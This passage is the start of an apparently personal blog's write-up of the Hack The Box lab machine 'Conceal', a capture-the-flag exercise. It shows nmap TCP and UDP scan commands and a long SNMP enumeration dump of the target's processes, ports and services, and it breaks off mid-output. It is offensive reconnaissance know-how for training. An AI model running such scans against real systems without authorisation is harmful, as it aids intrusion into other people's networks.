<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Conceal - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Conceal"><a href="#Hack-The-Box-Conceal" class="headerlink" title="Hack The Box - Conceal"></a>Hack The Box - Conceal</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining <a href="https://en.wikipedia.org/wiki/IPsec" target="_blank" rel="noopener">IPSEC</a> connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is <code>10.10.10.116</code>, I added it to <code>/etc/hosts</code> as <code>conceal.htb</code>. Let’s jump right in.<br><img src="/images/hackthebox/conceal/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services.<br><code>nmap -sV -sT -sC conceal.htb</code><br><img src="/images/hackthebox/conceal/1.png" alt=""><br>And we got nothing !<br>I ran another <code>nmap</code> UDP scan on all ports :<br><code>nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0</code><br>The output was too long so I will show the only important part :<br><img src="/images/hackthebox/conceal/2.png" alt=""><br><img src="/images/hackthebox/conceal/3.png" alt=""><br>It was not sure about port 161, but it showed that port 500 is open.<br>I ran a third scan on ports 500 and 161 :<br><code>nmap -p 161,500 -sV -sU -sC conceal.htb</code><br><img src="/images/hackthebox/conceal/4.png" alt=""><br>Full Output : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb</span><br><span class="line">Nmap scan report for conceal.htb (10.10.10.116)</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">161&#x2F;udp open  snmp    SNMPv1 server (public)</span><br><span class="line">| snmp-interfaces: </span><br><span class="line">|   Software Loopback Interface 1\x00</span><br><span class="line">|     IP address: 127.0.0.1  Netmask: 255.0.0.0</span><br><span class="line">|     Type: softwareLoopback  Speed: 1 Gbps</span><br><span class="line">|     Traffic stats: 0.00 Kb sent, 0.00 Kb received</span><br><span class="line">|   Intel(R) 82574L Gigabit Network Connection\x00</span><br><span class="line">|     IP address: 10.10.10.116  Netmask: 255.255.255.0</span><br><span class="line">|     MAC address: 00:50:56:b9:55:a7 (VMware)</span><br><span class="line">|     Type: ethernetCsmacd  Speed: 1 Gbps</span><br><span class="line">|     Traffic stats: 399.03 Kb sent, 6.41 Mb received</span><br><span class="line">|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00</span><br><span class="line">|     MAC address: 00:50:56:b9:55:a7 (VMware)</span><br><span class="line">|     Type: ethernetCsmacd  Speed: 1 Gbps</span><br><span class="line">|     Traffic stats: 399.03 Kb sent, 6.41 Mb received</span><br><span class="line">|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00</span><br><span class="line">|     MAC address: 00:50:56:b9:55:a7 (VMware)</span><br><span class="line">|     Type: ethernetCsmacd  Speed: 1 Gbps</span><br><span class="line">|     Traffic stats: 399.03 Kb sent, 6.41 Mb received</span><br><span class="line">|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00</span><br><span class="line">|     MAC address: 00:50:56:b9:55:a7 (VMware)</span><br><span class="line">|     Type: ethernetCsmacd  Speed: 1 Gbps</span><br><span class="line">|_    Traffic stats: 399.03 Kb sent, 6.41 Mb received</span><br><span class="line">| snmp-netstat: </span><br><span class="line">|   TCP  0.0.0.0:21           0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:80           0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:135          0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:445          0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:49664        0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:49665        0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:49666        0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:49667        0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:49668        0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:49669        0.0.0.0:0</span><br><span class="line">|   TCP  0.0.0.0:49670        0.0.0.0:0</span><br><span class="line">|   TCP  10.10.10.116:139     0.0.0.0:0</span><br><span class="line">|   UDP  0.0.0.0:123          *:*</span><br><span class="line">|   UDP  0.0.0.0:161          *:*</span><br><span class="line">|   UDP  0.0.0.0:500          *:*</span><br><span class="line">|   UDP  0.0.0.0:4500         *:*</span><br><span class="line">|   UDP  0.0.0.0:5050         *:*</span><br><span class="line">|   UDP  0.0.0.0:5353         *:*</span><br><span class="line">|   UDP  0.0.0.0:5355         *:*</span><br><span class="line">|   UDP  10.10.10.116:137     *:*</span><br><span class="line">|   UDP  10.10.10.116:138     *:*</span><br><span class="line">|   UDP  10.10.10.116:1900    *:*</span><br><span class="line">|   UDP  10.10.10.116:65496   *:*</span><br><span class="line">|   UDP  127.0.0.1:1900       *:*</span><br><span class="line">|_  UDP  127.0.0.1:65497      *:*</span><br><span class="line">| snmp-processes: </span><br><span class="line">|   1: </span><br><span class="line">|     Name: System Idle Process</span><br><span class="line">|   4: </span><br><span class="line">|     Name: System</span><br><span class="line">|   308: </span><br><span class="line">|     Name: smss.exe</span><br><span class="line">|   348: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|     Params: -k LocalSystemNetworkRestricted</span><br><span class="line">|   392: </span><br><span class="line">|     Name: csrss.exe</span><br><span class="line">|   468: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k LocalService</span><br><span class="line">|   472: </span><br><span class="line">|     Name: wininit.exe</span><br><span class="line">|   484: </span><br><span class="line">|     Name: csrss.exe</span><br><span class="line">|   564: </span><br><span class="line">|     Name: winlogon.exe</span><br><span class="line">|   584: </span><br><span class="line">|     Name: services.exe</span><br><span class="line">|   616: </span><br><span class="line">|     Name: lsass.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|   696: </span><br><span class="line">|     Name: fontdrvhost.exe</span><br><span class="line">|   704: </span><br><span class="line">|     Name: fontdrvhost.exe</span><br><span class="line">|   712: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k DcomLaunch</span><br><span class="line">|   812: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k RPCSS</span><br><span class="line">|   900: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|     Params: -k NetworkService</span><br><span class="line">|   908: </span><br><span class="line">|     Name: dwm.exe</span><br><span class="line">|   940: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k netsvcs</span><br><span class="line">|   976: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|     Params: -k LocalServiceNetworkRestricted</span><br><span class="line">|   984: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k LocalServiceNoNetwork</span><br><span class="line">|   1140: </span><br><span class="line">|     Name: vmacthlp.exe</span><br><span class="line">|     Path: C:\Program Files\VMware\VMware Tools\</span><br><span class="line">|   1232: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|     Params: -k LocalServiceNetworkRestricted</span><br><span class="line">|   1248: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k LocalSystemNetworkRestricted</span><br><span class="line">|   1292: </span><br><span class="line">|     Name: LogonUI.exe</span><br><span class="line">|     Params:  &#x2F;flags:0x0 &#x2F;state0:0xa3a2c855 &#x2F;state1:0x41c64e6d</span><br><span class="line">|   1392: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k LocalServiceNetworkRestricted</span><br><span class="line">|   1400: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|     Params: -k LocalServiceNetworkRestricted</span><br><span class="line">|   1492: </span><br><span class="line">|     Name: spoolsv.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|   1728: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k apphost</span><br><span class="line">|   1748: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|     Params: -k utcsvc</span><br><span class="line">|   1788: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k ftpsvc</span><br><span class="line">|   1856: </span><br><span class="line">|     Name: SecurityHealthService.exe</span><br><span class="line">|   1868: </span><br><span class="line">|     Name: snmp.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|   1892: </span><br><span class="line">|     Name: VGAuthService.exe</span><br><span class="line">|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\</span><br><span class="line">|   1912: </span><br><span class="line">|     Name: vmtoolsd.exe</span><br><span class="line">|     Path: C:\Program Files\VMware\VMware Tools\</span><br><span class="line">|   1932: </span><br><span class="line">|     Name: ManagementAgentHost.exe</span><br><span class="line">|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\</span><br><span class="line">|   1956: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k iissvcs</span><br><span class="line">|   1980: </span><br><span class="line">|     Name: MsMpEng.exe</span><br><span class="line">|   2068: </span><br><span class="line">|     Name: Memory Compression</span><br><span class="line">|   2204: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k LocalServiceAndNoImpersonation</span><br><span class="line">|   2444: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k NetworkServiceNetworkRestricted</span><br><span class="line">|   2952: </span><br><span class="line">|     Name: WmiPrvSE.exe</span><br><span class="line">|     Path: C:\Windows\system32\wbem\</span><br><span class="line">|   2976: </span><br><span class="line">|     Name: NisSrv.exe</span><br><span class="line">|   3052: </span><br><span class="line">|     Name: dllhost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: &#x2F;Processid:&#123;02D4B3F1-FD88-11D1-960D-00805FC79235&#125;</span><br><span class="line">|   3132: </span><br><span class="line">|     Name: SearchIndexer.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: &#x2F;Embedding</span><br><span class="line">|   3280: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params: -k appmodel</span><br><span class="line">|   3376: </span><br><span class="line">|     Name: msdtc.exe</span><br><span class="line">|     Path: C:\Windows\System32\</span><br><span class="line">|   3948: </span><br><span class="line">|     Name: svchost.exe</span><br><span class="line">|   5004: </span><br><span class="line">|     Name: SearchFilterHost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|     Params:  0 700 704 712 8192 708 </span><br><span class="line">|   5032: </span><br><span class="line">|     Name: SearchProtocolHost.exe</span><br><span class="line">|     Path: C:\Windows\system32\</span><br><span class="line">|_    Params:  Global\UsGthrFltPipeMssGthrPipe23_ Global\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 &quot;Software\Microsoft\Windows Search&quot; &quot;Moz</span><br><span class="line">| snmp-sysdescr: Hardware: Intel64 Family 6 Model 79 Stepping 1 AT&#x2F;AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)</span><br><span class="line">|_  System uptime: 2h08m26.61s (770661 timeticks)</span><br><span class="line">| snmp-win32-services: </span><br><span class="line">|   Application Host Helper Service</span><br><span class="line">|   Background Intelligent Transfer Service</span><br><span class="line">|   Background Tasks Infrastructure Service</span><br><span class="line">|   Base Filtering Engine</span><br><span class="line">|   CNG Key Isolation</span><br><span class="line">|   COM+ Event System</span><br><span class="line">|   COM+ System Application</span><br><span class="line">|   Client License Service (ClipSVC)</span><br><span class="line">|   Connected Devices Platform Service</span><br><span class="line">|   Connected User Experiences and Telemetry</span><br><span class="line">|   CoreMessaging</span><br><span class="line">|   Cryptographic Services</span><br><span class="line">|   DCOM Server Process Launcher</span><br><span class="line">|   DHCP Client</span><br><span class="line">|   DNS Client</span><br><span class="line">|   Data Sharing Service</span><br><span class="line">|   Data Usage</span><br><span class="line">|   Device Setup Manager</span><br><span class="line">|   Diagnostic Policy Service</span><br><span class="line">|   Diagnostic Service Host</span><br><span class="line">|   Distributed Link Tracking Client</span><br><span class="line">|   Distributed Transaction Coordinator</span><br><span class="line">|   Geolocation Service</span><br><span class="line">|   Group Policy Client</span><br><span class="line">|   IKE and AuthIP IPsec Keying Modules</span><br><span class="line">|   IP Helper</span><br><span class="line">|   IPsec Policy Agent</span><br><span class="line">|   Local Session Manager</span><br><span class="line">|   Microsoft Account Sign-in Assistant</span><br><span class="line">|   Microsoft FTP Service</span><br><span class="line">|   Network Connection Broker</span><br><span class="line">|   Network List Service</span><br><span class="line">|   Network Location Awareness</span><br><span class="line">|   Network Store Interface Service</span><br><span class="line">|   Plug and Play</span><br><span class="line">|   Power</span><br><span class="line">|   Print Spooler</span><br><span class="line">|   Program Compatibility Assistant Service</span><br><span class="line">|   RPC Endpoint Mapper</span><br><span class="line">|   Remote Procedure Call (RPC)</span><br><span class="line">|   SNMP Service</span><br><span class="line">|   SSDP Discovery</span><br><span class="line">|   Security Accounts Manager</span><br><span class="line">|   Security Center</span><br><span class="line">|   Server</span><br><span class="line">|   Shell Hardware Detection</span><br><span class="line">|   State Repository Service</span><br><span class="line">|   Storage Service</span><br><span class="line">|   Superfetch</span><br><span class="line">|   System Event Notification Service</span><br><span class="line">|   System Events Broker</span><br><span class="line">|   TCP&#x2F;IP NetBIOS Helper</span><br><span class="line">|   Task Scheduler</span><br><span class="line">|   Themes</span><br><span class="line">|   Tile Data model server</span><br><span class="line">|   Time Broker</span><br><span class="line">|   TokenBroker</span><br><span class="line">|   User Manager</span><br><span class="line">|   User Profile Service</span><br><span class="line">|   VMware Alias Manager and Ticket Service</span><br><span class="line">|   VMware CAF Management Agent Service</span><br><span class="line">|   VMware Physical Disk Helper Service</span><br><span class="line">|   VMware Tools</span><br><span class="line">|   WinHTTP Web Proxy Auto-Discovery Service</span><br><span class="line">|   Windows Audio</span><br><span class="line">|   Windows Audio Endpoint Builder</span><br><span class="line">|   Windows Connection Manager</span><br><span class="line">|   Windows Defender Antivirus Network Inspection Service</span><br><span class="line">|   Windows Defender Antivirus Service</span><br><span class="line">|   Windows Defender Security Centre Service</span><br><span class="line">|   Windows Driver Foundation - User-mode Driver Framework</span><br><span class="line">|   